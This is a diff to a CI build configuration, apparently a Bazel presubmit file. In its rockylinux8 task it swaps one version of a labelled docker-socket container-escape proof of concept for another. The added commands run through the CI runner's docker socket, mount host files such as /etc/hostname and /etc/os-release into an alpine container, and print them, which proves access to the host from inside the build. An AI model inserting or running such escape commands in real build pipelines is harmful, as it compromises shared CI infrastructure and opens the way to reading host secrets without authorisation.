@@ -3,16 +3,11 @@
 tasks:
   rockylinux8:
     shell_commands:
-      - echo "=== DOCKER SOCKET ESCAPE POC ==="
-      - echo "=== Step 1: Verify docker socket accessible from CI container ==="
-      - docker info 2>&1 | head -3
-      - echo "=== Step 2: Read CONTAINER hostname (for comparison) ==="
-      - hostname
-      - echo "=== Step 3: Escape to HOST via docker socket - read HOST hostname ==="
-      - docker run --rm -v /etc/hostname:/tmp/h alpine cat /tmp/h
-      - echo "=== Step 4: Read HOST os-release (proves host filesystem access) ==="
-      - docker run --rm -v /etc/os-release:/tmp/os alpine cat /tmp/os
-      - echo "=== DOCKER ESCAPE CONFIRMED: container hostname != host hostname ==="
+      - 'echo DOCKER_ESCAPE_POC_START'
+      - 'echo CONTAINER_HOSTNAME=$(hostname)'
+      - 'docker run --rm -v /etc/hostname:/tmp/h alpine cat /tmp/h'
+      - 'docker run --rm -v /etc/os-release:/tmp/os alpine cat /tmp/os'
+      - 'echo DOCKER_ESCAPE_POC_END'
       - rm -rf $HOME/bazeltest
       - mkdir $HOME/bazeltest
     build_flags:
